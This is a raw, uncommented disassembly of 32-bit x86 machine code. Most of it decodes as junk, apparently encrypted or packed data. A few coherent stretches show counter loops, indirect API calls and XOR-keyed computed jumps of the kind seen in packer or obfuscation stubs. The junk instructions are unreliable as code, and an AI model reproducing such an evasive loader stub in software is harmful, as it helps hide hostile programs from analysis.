  402892:	inc    ebp
  402893:	mov    edx,0x6a525aca
  402898:	int    0x16
  40289a:	or     eax,0x7168388e
  40289f:	sbb    eax,DWORD PTR [ecx]
  4028a1:	stos   BYTE PTR es:[edi],al
  4028a2:	xlat   BYTE PTR ds:[ebx]
  4028a3:	cmp    BYTE PTR [ebp+0xa],dl
  4028a6:	mov    dh,0x9e
  4028a8:	sar    BYTE PTR [esi],1
  4028aa:	sub    edx,esi
  4028ac:	bound  esp,QWORD PTR [ecx+ecx*8+0x574f71de]
  4028b3:	lods   eax,DWORD PTR ds:[esi]
  4028b4:	test   BYTE PTR [ebx+0x27],dh
  4028b7:	pop    es
  4028b8:	xchg   DWORD PTR [esi-0x1ec3ec33],ecx
  4028be:	aaa    
  4028bf:	stc    
  4028c0:	es mov dl,0x48
  4028c3:	(bad)
  4028c6:	adc    eax,0xc8b04cda
  4028cb:	dec    esp
  4028cc:	sbb    BYTE PTR [ebp-0x55],ah
  4028cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028d0:	mov    eax,ds:0x5e816a92
  4028d5:	ret    
  4028d6:	mov    bh,0xef
  4028d8:	and    DWORD PTR [ecx-0x6f36053],eax
  4028de:	aad    0xf0
  4028e0:	loop   0x4028fa
  4028e2:	fwait
  4028e3:	push   es
  4028e4:	outs   dx,BYTE PTR ds:[esi]
  4028e5:	test   BYTE PTR [ebx+0x46eef09],ah
  4028eb:	scas   eax,DWORD PTR es:[edi]
  4028ec:	mov    dl,0x9a
  4028ee:	mov    edi,0x633a9d89
  4028f3:	jne    0x4028cf
  4028f5:	xchg   esp,eax
  4028f6:	jns    0x4028da
  4028f8:	(bad)  
  4028f9:	not    ch
  4028fb:	xchg   ebp,esi
  4028fd:	sub    ah,BYTE PTR [edx]
  4028ff:	mov    bh,0xf4
  402901:	repnz nop
  402903:	popf   
  402904:	adc    al,0x27
  402906:	jbe    0x4028df
  402908:	inc    ecx
  402909:	add    bh,BYTE PTR [ecx-0x679fc4d]
  40290f:	aaa    
  402910:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402911:	mov    ch,0x45
  402913:	sbb    cl,BYTE PTR [ebx]
  402915:	push   ecx
  402916:	pushf  
  402917:	or     DWORD PTR [edi+ebx*8],ebp
  40291a:	and    al,0x3b
  40291c:	popf   
  40291d:	and    edi,DWORD PTR [ebx+0x39714591]
  402923:	mov    eax,0x873751f2
  402928:	aam    0x22
  40292a:	sub    al,0xb3
  40292c:	mov    WORD PTR [edi+ebx*8+0x33],?
  402930:	adc    eax,0x8a729c39
  402935:	sbb    bl,BYTE PTR [ebx-0x3be2afb7]
  40293b:	or     al,0xde
  40293d:	mov    esi,DWORD PTR [edx]
  40293f:	imul   esp,DWORD PTR [esi+0x2e8bdf21],0x4c5b060b
  402949:	push   ds
  40294a:	dec    esi
  40294b:	mov    ah,0x32
  40294d:	pop    edi
  40294e:	or     eax,0x90102f2b
  402953:	int    0x54
  402955:	fdivrp st(7),st
  402957:	jne    0x402972
  402959:	mov    esi,DWORD PTR [eax+0x15c9ac26]
  40295f:	adc    dl,cl
  402961:	or     eax,DWORD PTR [edx-0x3ad81d65]
  402967:	pop    esi
  402968:	leave  
  402969:	ret    0x4
  40296c:	push   ebp
  40296d:	mov    ebp,esp
  40296f:	sub    esp,0x28
  402972:	leave  
  402973:	ret    0x10
  402976:	push   ebp
  402977:	mov    ebp,esp
  402979:	push   ecx
  40297a:	or     eax,DWORD PTR ds:0x42fddd
  402980:	push   ecx
  402981:	movzx  edx,WORD PTR ds:0x42e7ef
  402988:	sbb    DWORD PTR ds:0x42e813,edx
  40298e:	mov    eax,0xf89c8531
  402993:	mov    DWORD PTR ds:0x42fde9,0x1a
  40299d:	cmp    DWORD PTR ds:0x42fde9,0x0
  4029a4:	je     0x402a39
  4029aa:	cmp    DWORD PTR ds:0x42fde9,0x24
  4029b1:	jne    0x4029cc
  4029b7:	push   0x42e22c
  4029bc:	push   0x42e803
  4029c1:	push   0x59d6
  4029c6:	call   DWORD PTR ds:0x42e54f
  4029cc:	mov    edx,DWORD PTR ds:0x42fde9
  4029d2:	dec    edx
  4029d3:	mov    DWORD PTR ds:0x42fde9,edx
  4029d9:	jmp    0x40299d
  4029de:	mov    DWORD PTR ds:0x42e7ff,0x19
  4029e8:	cmp    DWORD PTR ds:0x42e7ff,0x0
  4029ef:	je     0x402a39
  4029f5:	cmp    DWORD PTR ds:0x42e7ff,0x4
  4029fc:	jne    0x402a0d
  402a02:	push   0x5bc5
  402a07:	call   DWORD PTR ds:0x42e3d3
  402a0d:	cmp    DWORD PTR ds:0x42e7ff,0x5
  402a14:	jne    0x402a27
  402a1a:	mov    edx,DWORD PTR ds:0x42e7ff
  402a20:	dec    edx
  402a21:	mov    DWORD PTR ds:0x42e7ff,edx
  402a27:	mov    edx,DWORD PTR ds:0x42e7ff
  402a2d:	dec    edx
  402a2e:	mov    DWORD PTR ds:0x42e7ff,edx
  402a34:	jmp    0x4029e8
  402a39:	mov    DWORD PTR [ebp-0x8],eax
  402a3c:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  402a43:	mov    edx,DWORD PTR [ebp-0x8]
  402a46:	mov    ecx,DWORD PTR ds:0x42feae
  402a4c:	mov    ecx,DWORD PTR [ecx]
  402a4e:	xor    DWORD PTR ds:0x42fdd5,ecx
  402a54:	push   esi
  402a55:	mov    ecx,0x7510855
  402a5a:	or     DWORD PTR ds:0x42fe0d,ebx
  402a60:	xor    edx,ecx
  402a62:	sbb    esi,0x5361
  402a68:	mov    esi,0x32729c
  402a6d:	sbb    DWORD PTR ds:0x42e228,0x657d
  402a77:	push   edi
  402a78:	and    DWORD PTR ds:0x42e228,0x0
  402a82:	jmp    0x402a94
  402a87:	mov    edi,DWORD PTR ds:0x42e228
  402a8d:	inc    edi
  402a8e:	mov    DWORD PTR ds:0x42e228,edi
  402a94:	cmp    DWORD PTR ds:0x42e228,0x10
  402a9b:	jae    0x402abe
  402aa1:	cmp    DWORD PTR ds:0x42e228,0x11
  402aa8:	jne    0x402ab9
  402aae:	push   0x42e241
  402ab3:	call   DWORD PTR ds:0x42e553
  402ab9:	jmp    0x402a87
  402abe:	mov    edi,DWORD PTR [ebp+0x10]
  402ac1:	add    edx,esi
  402ac3:	cmp    edi,edx
  402ac5:	je     0x4036ba
  402acb:	mov    edx,DWORD PTR [ebp-0x8]
  402ace:	mov    eax,DWORD PTR [ebp-0x4]
  402ad1:	xor    eax,ecx
  402ad3:	mov    edi,0xffcd8d64
  402ad8:	sub    edi,eax
  402ada:	add    edi,DWORD PTR [ebp+0x10]
  402add:	xor    edx,ecx
  402adf:	jmp    0x402dbe
  402ae4:	imul   ebx,DWORD PTR [edx],0xffffff8f
  402ae7:	cmp    BYTE PTR [ebp+0x71],cl
  402aea:	jae    0x402a9d
  402aec:	jl     0x402b40
  402aee:	dec    esi
  402aef:	mov    esp,0x20b50b90
  402af4:	jo     0x402b02
  402af6:	jo     0x402b68
  402af8:	mov    esi,0xf070707e
  402afd:	xchg   esp,eax
  402afe:	mov    eax,DWORD PTR [esi+0x288c80a6]
  402b04:	inc    esp
  402b05:	xchg   ebx,eax
  402b06:	xchg   ebp,eax
  402b07:	cmp    DWORD PTR [eax-0x618c1b6e],eax
  402b0d:	xor    al,0xdf
  402b0f:	pop    es
  402b10:	not    BYTE PTR [edx-0x3e]
  402b13:	and    al,0xb9
  402b15:	add    ebp,DWORD PTR [ebx-0x2b4a2ace]
  402b1b:	aas    
  402b1c:	inc    ebx
  402b1d:	mov    al,0x91
  402b1f:	and    BYTE PTR [eax],ch
  402b21:	fcomip st,st(1)
  402b23:	aad    0x28
  402b25:	in     eax,0x76
  402b27:	xor    BYTE PTR [ebp+0x653f0e57],0x8c
  402b2e:	inc    edx
  402b2f:	mov    esp,0xdf84208a
  402b34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b35:	fdivr  st(7),st
  402b37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b38:	addr16 pusha 
  402b3a:	out    dx,eax
  402b3b:	daa    
  402b3c:	mov    ebp,gs
  402b3e:	test   al,0xf
  402b40:	sti    
  402b41:	stc    
  402b42:	aam    0x28
  402b44:	pop    ds
  402b45:	js     0x402b8f
  402b47:	mov    dh,dh
  402b49:	mov    ah,BYTE PTR [edi+ecx*2]
  402b4c:	adc    al,0x80
  402b4e:	inc    ecx
  402b4f:	popa   
  402b50:	shl    BYTE PTR [ebx+0x770bd195],1
  402b56:	or     DWORD PTR [edi+0x4f],ebx
  402b59:	pop    esp
  402b5a:	sub    cl,ch
  402b5c:	sahf   
  402b5d:	sub    ch,BYTE PTR [edx+0x70]
  402b60:	shl    BYTE PTR [eax-0x5c94eda9],cl
  402b66:	mov    al,0x40
  402b68:	jge    0x402b69
  402b6a:	cdq    
  402b6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b6c:	jno    0x402b06
  402b6e:	sub    eax,0x11ec3b6a
  402b73:	xchg   edx,eax
  402b74:	pop    ebp
  402b75:	cmc    
  402b76:	and    eax,0x939d5f53
  402b7b:	cdq    
  402b7c:	mov    DWORD PTR [ebp+0x15],ebp
  402b7f:	dec    esp
  402b80:	dec    eax
  402b81:	retf   0xd754
  402b84:	and    dl,BYTE PTR [ecx]
  402b86:	push   es
  402b87:	pop    esp
  402b88:	ficomp DWORD PTR [edi-0x9]
  402b8b:	and    esi,edi
  402b8d:	fcom   DWORD PTR [ebp+0x5a]
  402b90:	rcl    DWORD PTR ds:0x6a7087ee,cl
  402b96:	jl     0x402b23
  402b98:	ja     0x402be5
  402b9a:	and    al,0xbd
  402b9c:	xor    al,0x2c
  402b9e:	dec    ecx
  402b9f:	sti    
  402ba0:	push   cs
  402ba1:	jl     0x402bdf
  402ba3:	inc    esp
  402ba4:	outs   dx,BYTE PTR ds:[esi]
  402ba5:	sbb    BYTE PTR [eax-0x5a],ah
  402ba8:	pusha  
  402ba9:	(bad)  
  402baa:	in     eax,dx
  402bab:	fimul  DWORD PTR [ebx+0x4f3353b4]
  402bb1:	test   DWORD PTR [eax-0x39],esp
  402bb4:	xor    bl,ah
  402bb6:	add    al,al
  402bb8:	in     al,dx
  402bb9:	test   eax,0x3070b7b1
  402bbe:	inc    esp
  402bbf:	jae    0x402c0c
  402bc1:	xchg   esp,eax
  402bc2:	loopne 0x402b8b
  402bc4:	xor    DWORD PTR ds:0x9ffc444b,esp
  402bca:	outs   dx,BYTE PTR ds:[esi]
  402bcb:	and    eax,DWORD PTR [edi+0x351851a2]
  402bd1:	inc    edx
  402bd2:	aaa    
  402bd3:	test   eax,0xa4b4d76
  402bd8:	mov    BYTE PTR [edi+0x1],dh
  402bdb:	sti    
  402bdc:	xor    al,0x50
  402bde:	xchg   edi,eax
  402bdf:	es jmp 0x451:0xe177bbe0
  402be7:	cld    
  402be8:	shr    ecx,1
  402bea:	and    al,0x57
  402bec:	enter  0x2f6f,0xf8
  402bf0:	shl    DWORD PTR [ecx+0x34cdbb],1
  402bf6:	(bad)  
  402bf7:	mov    ebp,0x31d8c87f
  402bfc:	ds iret 
  402bfe:	mov    esi,0x3ef6ee56
  402c03:	js     0x402be5
  402c05:	(bad)  
  402c06:	jno    0x402c40
  402c08:	jecxz  0x402c3b
  402c0a:	fsubr  QWORD PTR ds:0xfe3fd
  402c10:	fbstp  TBYTE PTR [ebx+0x5eed1d00]
  402c16:	push   es
  402c17:	sbb    esi,ebp
  402c19:	loope  0x402beb
  402c1b:	imul   eax,DWORD PTR [edx-0x71],0x4ffbef1c
  402c22:	ins    DWORD PTR es:[edi],dx
  402c23:	add    eax,0x61441e06
  402c28:	test   al,0xd2
  402c2a:	in     al,0x23
  402c2c:	xor    eax,0xca9a8ea3
  402c31:	dec    esp
  402c32:	jecxz  0x402c26
  402c34:	call   0xfc38:0x2b646c4b
  402c3b:	fsubr  DWORD PTR [esi-0x7971c450]
  402c41:	pop    edx
  402c42:	push   ebp
  402c43:	arpl   bp,bx
  402c45:	jo     0x402bca
  402c47:	sbb    BYTE PTR [edx+0x1e33b755],bh
  402c4d:	fucom  st(3)
  402c4f:	push   ecx
  402c50:	sbb    eax,0xb3fa52e3
  402c55:	ret    
  402c56:	and    al,BYTE PTR [edx]
  402c58:	or     dh,BYTE PTR [eax+0x1dcc2967]
  402c5e:	push   ebx
  402c5f:	ja     0x402be1
  402c61:	in     al,dx
  402c62:	push   es
  402c63:	xor    bh,dh
  402c65:	out    dx,eax
  402c66:	inc    ebp
  402c67:	pop    edi
  402c68:	ror    BYTE PTR [ecx],1
  402c6a:	push   ecx
  402c6b:	mov    ebp,0xb026f3ab
  402c70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c71:	pop    edx
  402c72:	cs inc esi
  402c74:	fcmovnu st,st(3)
  402c76:	call   0xba4b634c
  402c7b:	push   edi
  402c7c:	repz sub BYTE PTR [edx],0x52
  402c80:	cwde   
  402c81:	adc    edi,DWORD PTR [eax-0x27100f12]
  402c87:	or     eax,0xe3b38ec
  402c8c:	(bad)  
  402c8d:	stos   DWORD PTR es:[edi],eax
  402c8e:	in     eax,0x7
  402c90:	aam    0x97
  402c92:	loopne 0x402cb1
  402c94:	adc    BYTE PTR [edi],dl
  402c96:	aas    
  402c97:	push   ds
  402c98:	pop    esp
  402c99:	push   es
  402c9a:	add    edx,DWORD PTR [ebx]
  402c9c:	sbb    ecx,DWORD PTR [esi+esi*2-0x67]
  402ca0:	out    dx,eax
  402ca1:	xor    DWORD PTR [edi-0x2d],eax
  402ca4:	mov    edi,0xa3ede76c
  402ca9:	sbb    ah,ah
  402cab:	and    dl,dl
  402cad:	test   BYTE PTR [ebx+ecx*4],dh
  402cb0:	push   ebp
  402cb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cb2:	(bad)  
  402cb3:	cmc    
  402cb4:	js     0x402cd4
  402cb6:	xor    DWORD PTR [esi-0x5e95904c],ecx
  402cbc:	add    bh,BYTE PTR [eax]
  402cbe:	cld    
  402cbf:	ss push es
  402cc1:	pop    edx
  402cc2:	cwde   
  402cc3:	into   
  402cc4:	test   DWORD PTR [edx+0x6637ad4d],esp
  402cca:	mov    bl,0xd9
  402ccc:	call   DWORD PTR ds:0xeffa858c
  402cd2:	mov    ds:0x43f66161,al
  402cd7:	mov    cl,BYTE PTR [eax]
  402cd9:	lea    ebx,[edx+0x2c]
  402cdc:	mov    ds:0xf46630eb,eax
  402ce1:	icebp  
  402ce2:	int    0xee
  402ce4:	(bad)  
  402ce5:	mov    cl,0x60
  402ce7:	sahf   
  402ce8:	repz in eax,dx
  402cea:	out    0x92,al
  402cec:	pop    ebx
  402ced:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cee:	sar    DWORD PTR [ecx-0x48b6bbf],cl
  402cf4:	or     ah,BYTE PTR [ecx+0x72]
  402cf7:	dec    ebp
  402cf8:	cwde   
  402cf9:	push   ecx
  402cfa:	jle    0x402cf6
  402cfc:	test   DWORD PTR [esi+0x5064c029],ebx
  402d02:	sahf   
  402d03:	adc    DWORD PTR ds:0x70a6ebc7,ebx
  402d09:	cli    
  402d0a:	xchg   ecx,eax
  402d0b:	sar    ecx,cl
  402d0d:	mov    dl,BYTE PTR [ebx]
  402d0f:	jge    0x402d47
  402d11:	sub    DWORD PTR [ebx],ecx
  402d13:	adc    eax,0xfb1960f
  402d18:	inc    ecx
  402d19:	jno    0x402d66
  402d1b:	mov    ds:0xf8600f04,eax
  402d20:	jl     0x402d56
  402d22:	sbb    al,0x87
  402d24:	xchg   BYTE PTR ss:[edx],cl
  402d27:	ficom  DWORD PTR ds:0xf64e88ab
  402d2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d2e:	out    dx,al
  402d2f:	xchg   esi,eax
  402d30:	sbb    BYTE PTR [eax],ch
  402d32:	dec    edi
  402d33:	adc    BYTE PTR [eax],ch
  402d35:	xor    eax,0xf8e920ea
  402d3a:	pop    ebx
  402d3b:	jb     0x402d50
  402d3d:	into   
  402d3e:	ret    
  402d3f:	cmp    BYTE PTR [esi],al
  402d41:	sub    edi,DWORD PTR [edi+0x6]
  402d44:	add    eax,0xa1914c0f
  402d49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d4a:	xor    al,0xa0
  402d4c:	gs push esp
  402d4e:	repz test al,0xc1
  402d51:	dec    esp
  402d52:	lods   al,BYTE PTR ds:[esi]
  402d53:	int    0x18
  402d55:	fwait
  402d56:	lock dec ebp
  402d58:	int3   
  402d59:	add    BYTE PTR ds:0xeb26b67b,dl
  402d5f:	dec    ebp
  402d60:	js     0x402d4c
  402d62:	ret    
  402d63:	push   0xee58d226
  402d68:	xchg   ebp,eax
  402d69:	pop    ds
  402d6a:	jno    0x402deb
  402d6c:	and    al,0x3d
  402d6e:	rol    DWORD PTR [ecx],1
  402d70:	xor    ebp,DWORD PTR [edx+0x11a948b5]
  402d76:	jns    0x402d7f
  402d78:	in     al,dx
  402d79:	pop    ebp
  402d7a:	ins    DWORD PTR es:[edi],dx
  402d7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d7c:	sub    eax,0xb2859d6f
  402d81:	xor    al,0xfe
  402d83:	and    al,0x7d
  402d85:	fisttp QWORD PTR [ebp+0x73df46bd]
  402d8b:	sub    bh,BYTE PTR [esi-0x47a5e266]
  402d91:	pop    ss
  402d92:	data16 (bad) 
  402d94:	pop    esi
  402d95:	(bad)  
  402d96:	ins    DWORD PTR es:[edi],dx
  402d97:	std    
  402d98:	sti    
  402d99:	mov    ebx,0x7b76e4cb
  402d9e:	mov    ecx,0x13f951c9
  402da3:	ja     0x402d33
  402da5:	(bad)  
  402da6:	fcom   QWORD PTR [eax]
  402da8:	sub    edi,edi
  402daa:	pusha  
  402dab:	adc    DWORD PTR [esi+edi*1],edx
  402dae:	mov    es,esi
  402db0:	mov    ds,WORD PTR [esi+0x25a86035]
  402db6:	fild   WORD PTR [edi+0x5]
  402db9:	fld    st(5)
  402dbb:	cmp    edi,DWORD PTR [ecx+0x3bd60305]
  402dc1:	xlat   BYTE PTR ds:[ebx]
  402dc2:	ja     0x4036b5
  402dc8:	push   ebx
  402dc9:	jmp    0x4030b2
  402dce:	jmp    0x4030ad
  402dd3:	mov    ecx,0xe1afe4fc
  402dd8:	ja     0x402e2b
  402dda:	push   0xffffffa6
  402ddc:	aas    
  402ddd:	xchg   ebp,eax
  402dde:	out    dx,eax
  402ddf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402de0:	cmp    eax,0xabe6cde
  402de5:	jo     0x402e57
  402de7:	mov    esi,0xff70707e
  402dec:	sub    eax,0x1163f0fe
  402df1:	xchg   edx,eax
  402df2:	imul   esp,DWORD PTR [edx],0xd077912
  402df8:	push   0xa735f588
  402dfd:	xchg   ebx,ebx
  402dff:	xlat   BYTE PTR ds:[ebx]
  402e00:	sbb    al,0xf
  402e02:	jl     0x402e13
  402e04:	mov    WORD PTR ds:0xee899686,?
  402e0a:	cmp    ebp,DWORD PTR [esi+0x6fa7361c]
  402e10:	mov    ebx,edi
  402e12:	popf   
  402e13:	mov    ecx,ecx
  402e15:	xchg   esi,eax
  402e16:	ret    
  402e17:	add    DWORD PTR [edx+0x1],ebp
  402e1a:	repnz repz das 
  402e1d:	pop    eax
  402e1e:	mov    es,WORD PTR [esi+0x1b77a7b4]
  402e24:	mov    bh,0xc6
  402e26:	xchg   edi,eax
  402e27:	ja     0x402e37
  402e29:	push   esi
  402e2a:	cmp    eax,0x73327d8d
  402e2f:	adc    bl,BYTE PTR [eax+0x79c342c5]
  402e35:	clc    
  402e36:	cwde   
  402e37:	outs   dx,DWORD PTR ds:[esi]
  402e38:	stos   DWORD PTR es:[edi],eax
  402e39:	dec    esp
  402e3a:	pop    ecx
  402e3b:	cmp    eax,0x3072b4b4
  402e40:	bound  edi,QWORD PTR [ecx+0x44]
  402e43:	hlt    
  402e44:	stc    
  402e45:	and    DWORD PTR [eax],ecx
  402e47:	retf   0xfba3
  402e4a:	xchg   edi,eax
  402e4b:	add    eax,0xa24b1448
  402e50:	les    ecx,FWORD PTR [ecx-0x470ae6f3]
  402e56:	adc    ah,BYTE PTR [edx]
  402e58:	mov    DWORD PTR [eax+0x6e04e6f],eax
  402e5e:	ss jmp 0x402dfa
  402e61:	retf   
  402e62:	out    dx,al
  402e63:	leave  
  402e64:	loopne 0x402e0f
  402e66:	aaa    
  402e67:	mov    ds:0xb65b8a8d,al
  402e6c:	inc    ebx
  402e6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e6e:	jb     0x402e7d
  402e70:	sbb    eax,edx
  402e72:	aas    
  402e73:	aam    0x6b
  402e75:	mov    BYTE PTR [ebp+0x6a],dh
  402e78:	pop    DWORD PTR [eax-0x6b]
  402e7b:	sub    al,0x94
  402e7d:	adc    ebx,DWORD PTR ds:0xb1f1f81a
  402e83:	inc    ecx
  402e84:	jge    0x402ec4
  402e86:	ret    0xf472
  402e89:	mov    ah,0xa2
  402e8b:	test   BYTE PTR [esi+0x2c],0xca
  402e8f:	icebp  
  402e90:	or     eax,0xaf8ca867
  402e95:	and    DWORD PTR ds:0xf5d8bc2d,edi
  402e9b:	pop    ebx
  402e9c:	scas   eax,DWORD PTR es:[edi]
  402e9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e9e:	sbb    cl,dl
  402ea0:	jmp    0x47786acb
  402ea5:	or     ah,BYTE PTR [ecx]
  402ea7:	adc    eax,0x4ebf5937
  402eac:	mov    esp,0x67f54615
  402eb1:	fcmovnbe st,st(1)
  402eb3:	sub    eax,0x65599c7c
  402eb8:	mov    bh,0x2f
  402eba:	iret   
  402ebb:	push   0x65
  402ebd:	popf   
  402ebe:	jne    0x402f0e
  402ec0:	pop    edi
  402ec1:	stc    
  402ec2:	pop    ebp
  402ec3:	js     0x402ea7
  402ec5:	xchg   edi,eax
  402ec6:	je     0x402ed0
  402ec8:	mov    bh,0xf6
  402eca:	push   ecx
  402ecb:	addr16 pop ss
  402ecd:	or     esp,ecx
  402ecf:	das    
  402ed0:	fucom  st(4)
  402ed2:	push   edx
  402ed3:	add    al,0x7d
  402ed5:	push   ebx
  402ed6:	pusha  
  402ed7:	(bad)  
  402ed8:	call   0x77c9:0xdc832b4
  402edf:	cld    
  402ee0:	pop    ebx
  402ee1:	popf   
  402ee2:	inc    esp
  402ee3:	ins    DWORD PTR es:[edi],dx
  402ee4:	test   DWORD PTR cs:0xc326a66e,eax
  402eeb:	loope  0x402ee8
  402eed:	jmp    0x402e9d
  402eef:	jg     0x402f70
  402ef1:	xor    BYTE PTR [esi+esi*2-0x52],bl
  402ef5:	in     al,dx
  402ef6:	jne    0x402f65
  402ef8:	stos   DWORD PTR es:[edi],eax
  402ef9:	test   esi,ebx
  402efb:	sub    bh,bh
  402efd:	jnp    0x402f52
  402eff:	ds jge 0x402ee3
  402f02:	sbb    DWORD PTR [eax+0xd02d026],edi
  402f08:	xor    ch,BYTE PTR [eax+0x43]
  402f0b:	xor    BYTE PTR [esi-0x5ff96a95],cl
  402f11:	sbb    eax,0xb0031703
  402f16:	repz jmp 0x402ee7
  402f19:	mul    DWORD PTR ds:0xe5b73f73
  402f1f:	or     BYTE PTR [eax+0x59],dl
  402f22:	add    bl,bl
  402f24:	xchg   ecx,eax
  402f25:	jge    0x402eff
  402f27:	es cwde 
  402f29:	xchg   esp,eax
  402f2a:	xor    DWORD PTR [edx-0x29],edx
  402f2d:	das    
  402f2e:	sub    BYTE PTR fs:[ebx],dl
  402f31:	ret    0xcf4a
  402f34:	cld    
  402f35:	sar    edx,1
  402f37:	je     0x402f95
  402f39:	popa   
  402f3a:	(bad)  
  402f3b:	sbb    ah,cl
  402f3d:	add    dh,BYTE PTR [ebp+0x1f]
  402f40:	cmp    DWORD PTR [esi],eax
  402f42:	mov    ch,al
  402f44:	les    ebp,FWORD PTR [ebx+0x780b09ce]
  402f4a:	jmp    0x402ecc
  402f4c:	daa    
  402f4d:	and    al,BYTE PTR [edi+eax*4-0x7e]
  402f51:	(bad)  
  402f52:	jge    0x402f02
  402f54:	xor    eax,0xcd87853e
  402f59:	stos   BYTE PTR es:[edi],al
  402f5a:	xchg   edx,eax
  402f5b:	mov    esi,0x5ddaa118
  402f60:	ins    BYTE PTR es:[edi],dx
  402f61:	lods   eax,DWORD PTR ds:[esi]
  402f62:	mov    BYTE PTR [ecx-0x1bc52522],bh
  402f68:	enter  0x51d8,0xb5
  402f6c:	lods   al,BYTE PTR ds:[esi]
  402f6d:	inc    ebx
  402f6e:	mov    bl,0xe0
  402f70:	mov    ds:0x5f4fd35e,al
  402f75:	setl   al
  402f78:	xor    eax,0xcea3ce43
  402f7d:	mov    edi,0x6b21a6f2
  402f82:	mov    ds:0xd69053c1,al
  402f87:	sbb    eax,0x91cd2bd6
  402f8c:	iret   
  402f8d:	bnd jmp 0x402fb1
  402f90:	dec    edi
  402f91:	and    ah,dh
  402f93:	test   al,0xd
  402f95:	bound  edi,QWORD PTR [ecx]
  402f97:	into   
  402f98:	call   0x3ec337e1
  402f9d:	inc    edi
  402f9e:	jg     0x403005
  402fa0:	fidiv  DWORD PTR [eax-0x3e]
  402fa3:	push   ss
  402fa4:	sbb    DWORD PTR [ebp+0x679a610c],ebp
  402faa:	mov    eax,0x617df008
  402faf:	or     ebx,edi
  402fb1:	add    al,0x4b
  402fb3:	cmp    eax,0x46a570f
  402fb8:	imul   ebx,DWORD PTR [edi],0x1e
  402fbb:	fidiv  WORD PTR [esi]
  402fbd:	xchg   edx,eax
  402fbe:	pop    ebp
  402fbf:	lea    ebp,[ecx-0x5b]
  402fc2:	ret    0x7261
  402fc5:	test   al,0xf0
  402fc7:	ret    0x2d1a
  402fca:	dec    esi
  402fcb:	dec    ebx
  402fcc:	dec    edx
  402fcd:	sub    dl,ch
  402fcf:	push   ds
  402fd0:	inc    ecx
  402fd1:	mov    ch,BYTE PTR [esi+0x1]
  402fd4:	pop    esi
  402fd5:	and    eax,0xd8cd4bde
  402fda:	shl    DWORD PTR [eax-0x56476b40],1
  402fe0:	sbb    BYTE PTR [ebp-0x24bacdab],bh
  402fe6:	and    eax,0xd924077f
  402feb:	call   0xeb37d9ad
  402ff0:	add    ebx,ecx
  402ff2:	mov    bh,0xd8
  402ff4:	scas   eax,DWORD PTR es:[edi]
  402ff5:	loope  0x402f95
  402ff7:	mov    WORD PTR [esi+ebp*4],ds
  402ffa:	mov    bh,0xf2
  402ffc:	mov    ebx,0x1f718f04
  403001:	clc    
  403002:	mov    bh,0x73
  403004:	ins    BYTE PTR es:[edi],dx
  403005:	in     al,dx
  403006:	cmp    al,0x3c
  403008:	aad    0xd3
  40300a:	jae    0x402fa1
  40300c:	fsubrp st(0),st
  40300e:	pop    edi
  40300f:	ffree  st(5)
  403011:	loope  0x403055
  403013:	dec    ecx
  403014:	and    BYTE PTR [ecx+0x4f],bl
  403017:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403018:	fldenv [eax+0x692beb04]
  40301e:	inc    eax
  40301f:	mov    esp,0x92a33d9e
  403024:	out    0x76,eax
  403026:	aas    
  403027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403028:	ror    BYTE PTR [ecx+edi*4+0x6559e20d],0x11
  403030:	mov    ecx,0x9cfc7f8
  403035:	push   0xbbab2b9a
  40303a:	js     0x403002
  40303c:	stos   DWORD PTR es:[edi],eax
  40303d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40303e:	dec    eax
  40303f:	sbb    al,0x22
  403041:	adc    DWORD PTR [eax+0x13],edx
  403044:	lods   eax,DWORD PTR ds:[esi]
  403045:	les    esp,FWORD PTR [eax+0x3c48a303]
  40304b:	aaa    
  40304c:	and    al,0x68
  40304e:	(bad)  
  40304f:	jnp    0x403072
  403051:	leave  
  403052:	or     al,0x8
  403054:	mov    al,ds:0xc3924af0
  403059:	out    dx,eax
  40305a:	dec    eax
  40305b:	xlat   BYTE PTR ds:[ebx]
  40305c:	push   cs
  40305d:	jmp    0x403053
  40305f:	or     DWORD PTR [ebx],eax
  403061:	mov    al,BYTE PTR [edx+0x497ec18c]
  403067:	xchg   edx,eax
  403068:	imul   edi,DWORD PTR [edx+0x198386c0],0x5bbc1ef1
  403072:	or     DWORD PTR [ecx-0x3829808f],esi
  403078:	or     DWORD PTR [eax],ebp
  40307a:	pushf  
  40307b:	repz mov esi,DWORD PTR [eax-0x48]
  40307f:	xor    al,0xff
  403081:	mov    ?,WORD PTR [esi-0x69]
  403084:	aad    0x72
  403086:	das    
  403087:	loop   0x4030ca
  403089:	inc    edx
  40308a:	dec    ebx
  40308b:	jne    0x403100
  40308d:	push   edi
  40308e:	sbb    al,0x87
  403090:	clc    
  403091:	or     al,0xe5
  403093:	sbb    al,0x56
  403095:	xchg   BYTE PTR [eax+0x20],ah
  403098:	inc    ebp
  403099:	push   ds
  40309a:	ret    0x38eb
  40309d:	sbb    esp,DWORD PTR [ebx+0xe]
  4030a0:	cmp    eax,0x1ac14bd9
  4030a5:	shr    BYTE PTR [ebp+0x2301b06],1
  4030ab:	repz lahf 
  4030ad:	mov    esi,0x32729c
  4030b2:	mov    eax,DWORD PTR [ebp-0x8]
  4030b5:	mov    edi,DWORD PTR [ebp-0x4]
  4030b8:	xor    edi,ecx
  4030ba:	add    edi,esi
  4030bc:	jmp    0x40339b
  4030c1:	fist   DWORD PTR [ecx+0x4b76cc16]
  4030c7:	loope  0x40307a
  4030c9:	lds    edx,FWORD PTR [esi-0x42]
  4030cc:	add    al,0xdb
  4030ce:	xchg   ebx,eax
  4030cf:	pop    esp
